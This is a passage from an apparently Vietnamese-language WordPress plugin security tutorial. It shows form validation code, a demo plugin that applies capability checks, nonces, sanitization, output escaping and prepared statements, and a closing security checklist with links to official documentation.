        $exists = $wpdb->get_var(
            $wpdb->prepare(
                "SELECT COUNT(*) FROM {$wpdb->prefix}contacts WHERE email = %s AND id != %d",
                $data['email'],
                $data['id'] ?? 0
            )
        );
        if ( $exists > 0 ) {
            $errors['email'] = 'Email nay da duoc su dung.';
        }
    }

    // === FILE UPLOAD ===
    if ( ! empty( $_FILES['avatar'] ) && $_FILES['avatar']['error'] === UPLOAD_ERR_OK ) {
        $allowed_types = array( 'image/jpeg', 'image/png' );
        $max_size = 2 * 1024 * 1024; // 2MB

        $file_info = wp_check_filetype( $_FILES['avatar']['name'] );
        if ( ! in_array( $file_info['type'], $allowed_types ) ) {
            $errors['avatar'] = 'Chi chap nhan file JPG hoac PNG.';
        }

        if ( $_FILES['avatar']['size'] > $max_size ) {
            $errors['avatar'] = 'File qua lon. Toi da 2MB.';
        }
    }

    // === CUSTOM (tuy chinh) ===
    // Kiem tra password
    if ( ! empty( $data['password'] ) ) {
        if ( strlen( $data['password'] ) < 8 ) {
            $errors['password'] = 'Mat khau phai co it nhat 8 ky tu.';
        }
        if ( ! preg_match( '/[A-Z]/', $data['password'] ) ) {
            $errors['password'] = 'Mat khau phai co it nhat 1 chu hoa.';
        }
        if ( ! preg_match( '/[0-9]/', $data['password'] ) ) {
            $errors['password'] = 'Mat khau phai co it nhat 1 so.';
        }
    }

    return $errors;
}

// === SU DUNG ===
function process_form() {
    // 1. Sanitize
    $data = array(
        'name'    => sanitize_text_field( $_POST['name'] ?? '' ),
        'email'   => sanitize_email( $_POST['email'] ?? '' ),
        'phone'   => sanitize_text_field( $_POST['phone'] ?? '' ),
        'website' => esc_url_raw( $_POST['website'] ?? '' ),
        'age'     => absint( $_POST['age'] ?? 0 ),
        'status'  => sanitize_text_field( $_POST['status'] ?? 'pending' ),
    );

    // 2. Validate
    $errors = validate_contact_form( $data );

    if ( ! empty( $errors ) ) {
        // Co loi -> hien thi lai form voi thong bao loi
        foreach ( $errors as $field => $message ) {
            echo '<p class="error">' . esc_html( $message ) . '</p>';
        }
        return;
    }

    // 3. Luu vao database (voi prepare)
    global $wpdb;
    $wpdb->insert(
        $wpdb->prefix . 'contacts',
        $data,
        array( '%s', '%s', '%s', '%s', '%d', '%s' )
    );
}
```

---

## 11. Code vi du cho tung loai bao mat

### Plugin bao mat tong hop

```php
<?php
/**
 * Plugin Name:       Security Demo Plugin
 * Description:       Demo tat ca ky thuat bao mat trong WordPress plugin.
 * Version:           1.0.0
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

class Security_Demo_Plugin {

    public function __construct() {
        add_action( 'admin_menu', array( $this, 'add_menu' ) );
        add_action( 'admin_init', array( $this, 'handle_form' ) );
        add_action( 'wp_ajax_sdp_ajax_action', array( $this, 'handle_ajax' ) );
        add_action( 'rest_api_init', array( $this, 'register_api' ) );
    }

    public function add_menu() {
        add_options_page(
            'Security Demo',
            'Security Demo',
            'manage_options',  // CAPABILITY CHECK #1: Chi admin thay menu
            'security-demo',
            array( $this, 'render_page' )
        );
    }

    /**
     * Xu ly form submit - BAO MAT TOAN DIEN
     */
    public function handle_form() {
        if ( ! isset( $_POST['sdp_submit'] ) ) {
            return;
        }

        // BAO MAT #1: Kiem tra quyen
        if ( ! current_user_can( 'manage_options' ) ) {
            wp_die( 'Khong co quyen.' );
        }

        // BAO MAT #2: Kiem tra CSRF (nonce)
        check_admin_referer( 'sdp_save_settings', 'sdp_nonce' );

        // BAO MAT #3: Sanitize tat ca input
        $data = array(
            'name'    => sanitize_text_field( $_POST['sdp_name'] ?? '' ),
            'email'   => sanitize_email( $_POST['sdp_email'] ?? '' ),
            'url'     => esc_url_raw( $_POST['sdp_url'] ?? '' ),
            'content' => wp_kses_post( $_POST['sdp_content'] ?? '' ),
            'number'  => absint( $_POST['sdp_number'] ?? 0 ),
            'status'  => sanitize_text_field( $_POST['sdp_status'] ?? '' ),
        );

        // BAO MAT #4: Validate
        $errors = array();
        if ( empty( $data['name'] ) ) {
            $errors[] = 'Ten la bat buoc.';
        }
        if ( ! is_email( $data['email'] ) ) {
            $errors[] = 'Email khong hop le.';
        }
        if ( ! in_array( $data['status'], array( 'active', 'inactive' ), true ) ) {
            $errors[] = 'Trang thai khong hop le.';
        }
        if ( $data['number'] < 1 || $data['number'] > 100 ) {
            $errors[] = 'So phai tu 1 den 100.';
        }

        if ( ! empty( $errors ) ) {
            set_transient( 'sdp_errors', $errors, 30 );
            set_transient( 'sdp_form_data', $data, 30 );
            return;
        }

        // BAO MAT #5: Luu voi prepared statement
        global $wpdb;
        $wpdb->insert(
            $wpdb->prefix . 'sdp_items',
            $data,
            array( '%s', '%s', '%s', '%s', '%d', '%s' )
        );

        set_transient( 'sdp_success', 'Da luu thanh cong!', 30 );
    }

    /**
     * AJAX handler - BAO MAT TOAN DIEN
     */
    public function handle_ajax() {
        // BAO MAT #1: Kiem tra CSRF
        check_ajax_referer( 'sdp_ajax_nonce', 'nonce' );

        // BAO MAT #2: Kiem tra quyen
        if ( ! current_user_can( 'manage_options' ) ) {
            wp_send_json_error( array( 'message' => 'Forbidden' ), 403 );
        }

        // BAO MAT #3: Sanitize
        $action = sanitize_text_field( $_POST['sub_action'] ?? '' );
        $id = absint( $_POST['item_id'] ?? 0 );

        // BAO MAT #4: Validate
        if ( empty( $action ) || $id < 1 ) {
            wp_send_json_error( array( 'message' => 'Thieu du lieu.' ) );
        }

        // BAO MAT #5: Whitelisting actions
        $allowed_actions = array( 'activate', 'deactivate', 'delete' );
        if ( ! in_array( $action, $allowed_actions, true ) ) {
            wp_send_json_error( array( 'message' => 'Action khong hop le.' ) );
        }

        // BAO MAT #6: Prepare statement
        global $wpdb;
        $table = $wpdb->prefix . 'sdp_items';

        switch ( $action ) {
            case 'delete':
                $wpdb->delete( $table, array( 'id' => $id ), array( '%d' ) );
                break;

            case 'activate':
            case 'deactivate':
                $wpdb->update(
                    $table,
                    array( 'status' => $action === 'activate' ? 'active' : 'inactive' ),
                    array( 'id' => $id ),
                    array( '%s' ),
                    array( '%d' )
                );
                break;
        }

        wp_send_json_success( array( 'message' => 'Thanh cong!' ) );
    }

    /**
     * REST API - BAO MAT TOAN DIEN
     */
    public function register_api() {
        register_rest_route( 'sdp/v1', '/items', array(
            'methods'  => 'POST',
            'callback' => array( $this, 'api_create_item' ),
            // BAO MAT #1: Permission callback
            'permission_callback' => function() {
                return current_user_can( 'manage_options' );
            },
            // BAO MAT #2: Validate va Sanitize trong args
            'args' => array(
                'name' => array(
                    'required'          => true,
                    'sanitize_callback' => 'sanitize_text_field',
                    'validate_callback' => function( $value ) {
                        return ! empty( $value ) && strlen( $value ) <= 200;
                    },
                ),
                'email' => array(
                    'required'          => true,
                    'sanitize_callback' => 'sanitize_email',
                    'validate_callback' => 'is_email',
                ),
            ),
        ));
    }

    public function api_create_item( \WP_REST_Request $request ) {
        // Data da duoc sanitize va validate boi args
        $name  = $request->get_param( 'name' );
        $email = $request->get_param( 'email' );

        // BAO MAT #3: Prepare statement khi luu
        global $wpdb;
        $wpdb->insert(
            $wpdb->prefix . 'sdp_items',
            array( 'name' => $name, 'email' => $email ),
            array( '%s', '%s' )
        );

        return new \WP_REST_Response( array(
            'id'   => $wpdb->insert_id,
            'name' => $name, // Da duoc sanitize
        ), 201 );
    }

    /**
     * Render trang - ESCAPE TAT CA OUTPUT
     */
    public function render_page() {
        // BAO MAT: Kiem tra quyen
        if ( ! current_user_can( 'manage_options' ) ) {
            return;
        }

        $errors = get_transient( 'sdp_errors' );
        $success = get_transient( 'sdp_success' );
        $form_data = get_transient( 'sdp_form_data' ) ?: array();
        delete_transient( 'sdp_errors' );
        delete_transient( 'sdp_success' );
        delete_transient( 'sdp_form_data' );
        ?>
        <div class="wrap">
            <h1><?php echo esc_html( get_admin_page_title() ); ?></h1>

            <?php if ( $success ) : ?>
                <!-- BAO MAT: Escape thong bao -->
                <div class="notice notice-success"><p><?php echo esc_html( $success ); ?></p></div>
            <?php endif; ?>

            <?php if ( $errors ) : ?>
                <div class="notice notice-error">
                    <?php foreach ( $errors as $error ) : ?>
                        <p><?php echo esc_html( $error ); ?></p>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>

            <form method="post" action="">
                <!-- BAO MAT: Nonce field -->
                <?php wp_nonce_field( 'sdp_save_settings', 'sdp_nonce' ); ?>

                <table class="form-table">
                    <tr>
                        <th><label for="sdp_name">Ten</label></th>
                        <td>
                            <!-- BAO MAT: esc_attr cho value -->
                            <input type="text" name="sdp_name" id="sdp_name"
                                   value="<?php echo esc_attr( $form_data['name'] ?? '' ); ?>"
                                   class="regular-text">
                        </td>
                    </tr>
                    <tr>
                        <th><label for="sdp_email">Email</label></th>
                        <td>
                            <input type="email" name="sdp_email" id="sdp_email"
                                   value="<?php echo esc_attr( $form_data['email'] ?? '' ); ?>"
                                   class="regular-text">
                        </td>
                    </tr>
                    <tr>
                        <th><label for="sdp_url">Website</label></th>
                        <td>
                            <!-- BAO MAT: esc_attr (khong phai esc_url) cho value cua input -->
                            <input type="url" name="sdp_url" id="sdp_url"
                                   value="<?php echo esc_attr( $form_data['url'] ?? '' ); ?>"
                                   class="regular-text">
                        </td>
                    </tr>
                    <tr>
                        <th><label for="sdp_number">So luong</label></th>
                        <td>
                            <input type="number" name="sdp_number" id="sdp_number"
                                   value="<?php echo esc_attr( $form_data['number'] ?? 10 ); ?>"
                                   min="1" max="100" class="small-text">
                        </td>
                    </tr>
                    <tr>
                        <th><label for="sdp_status">Trang thai</label></th>
                        <td>
                            <select name="sdp_status" id="sdp_status">
                                <option value="active" <?php selected( $form_data['status'] ?? '', 'active' ); ?>>Active</option>
                                <option value="inactive" <?php selected( $form_data['status'] ?? '', 'inactive' ); ?>>Inactive</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <th><label for="sdp_content">Noi dung</label></th>
                        <td>
                            <textarea name="sdp_content" id="sdp_content" rows="5" class="large-text"><?php
                                echo esc_textarea( $form_data['content'] ?? '' );
                            ?></textarea>
                        </td>
                    </tr>
                </table>

                <?php submit_button( 'Luu cai dat', 'primary', 'sdp_submit' ); ?>
            </form>
        </div>
        <?php
    }
}

new Security_Demo_Plugin();
```

---

## 12. Best Practices

### Checklist bao mat cho moi plugin

```
INPUT:
[ ] Sanitize TAT CA input tu $_GET, $_POST, $_REQUEST, $_FILES
[ ] Validate du lieu truoc khi xu ly
[ ] Dung wp_kses() hoac wp_kses_post() cho HTML input

OUTPUT:
[ ] esc_html() cho text content
[ ] esc_attr() cho HTML attributes
[ ] esc_url() cho URLs (href, src)
[ ] esc_textarea() cho textarea content
[ ] esc_js() cho inline JavaScript
[ ] wp_json_encode() cho JSON trong <script>

CSRF:
[ ] wp_nonce_field() trong moi form
[ ] check_admin_referer() khi xu ly form
[ ] check_ajax_referer() trong moi AJAX handler
[ ] wp_nonce_url() cho moi action link

QUYEN:
[ ] current_user_can() truoc moi hanh dong
[ ] permission_callback trong moi REST route
[ ] Dung capabilities phu hop (khong qua rong)

DATABASE:
[ ] $wpdb->prepare() cho MOI query co bien
[ ] $wpdb->insert/update/delete (tu escape)
[ ] Whitelist cho ORDER BY, ten cot
[ ] $wpdb->esc_like() cho LIKE queries

FILE:
[ ] Kiem tra MIME type thuc su (wp_check_filetype)
[ ] Gioi han kich thuoc file
[ ] Dung wp_handle_upload()
[ ] Lam sach ten file (sanitize_file_name)

KHAC:
[ ] if (!defined('ABSPATH')) exit; o dau moi file
[ ] Khong de loi PHP hien thi trong production
[ ] Khong luu mat khau dang plain text
[ ] Su dung HTTPS cho moi external request
[ ] Cap nhat plugin thuong xuyen
```

---

## Tham khao

- [WordPress Plugin Security](https://developer.wordpress.org/plugins/security/)
- [Data Validation](https://developer.wordpress.org/plugins/security/data-validation/)
- [Securing Input](https://developer.wordpress.org/plugins/security/securing-input/)
- [Securing Output](https://developer.wordpress.org/plugins/security/securing-output/)
- [Nonces](https://developer.wordpress.org/plugins/security/nonces/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
